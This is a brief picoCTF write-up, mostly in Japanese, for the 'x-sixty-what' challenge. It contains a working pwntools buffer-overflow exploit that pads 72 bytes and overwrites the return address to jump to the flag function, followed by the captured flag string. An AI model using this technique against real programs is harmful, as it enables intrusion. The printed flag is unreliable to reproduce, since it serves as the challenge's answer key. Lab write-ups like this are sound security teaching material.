# x-sixty-what:bynary Medium  
Overflow x64 code  
  
Additional details will be available after launching your challenge instance  

# Solution  
バイナリとソースコードが渡される  
 from pwn import *  
>>> p = remote("saturn.picoctf.net", 58419)  
[x] Opening connection to saturn.picoctf.net on port 58419  
[x] Opening connection to saturn.picoctf.net on port 58419: Trying 13.59.203.175  
[+] Opening connection to saturn.picoctf.net on port 58419: Done  
>>> payload = b"a"*72   
>>> payload += p64(0x40123b)  
>>>   
>>> p.sendline(payload)  
>>> p.interactive()  
[*] Switching to interactive mode  
Welcome to 64-bit. Give me a string that gets you the flag:   
picoCTF{b1663r_15_b3773r_d95e02b6}[*] Got EOF while reading in interactive  

# 考えたこと    
gets(buf);という記述からバッファオーバーフローが狙えると考えた。
今回はリターンアドレスをFLAG関数のアドレスに書き換えることを狙う。
アドレスの大きさはBUFが６４バイトがコードからわかる。また、リターンアドレスはx86_64であることから８バイトであることが分かる。
よって、７２バイト以上の文字列を入力したらバッファオーバーフローが起きる
７２バイト分Aを入力し、FLAGの開始アドレスを入力し実行したらFLAGを取得できた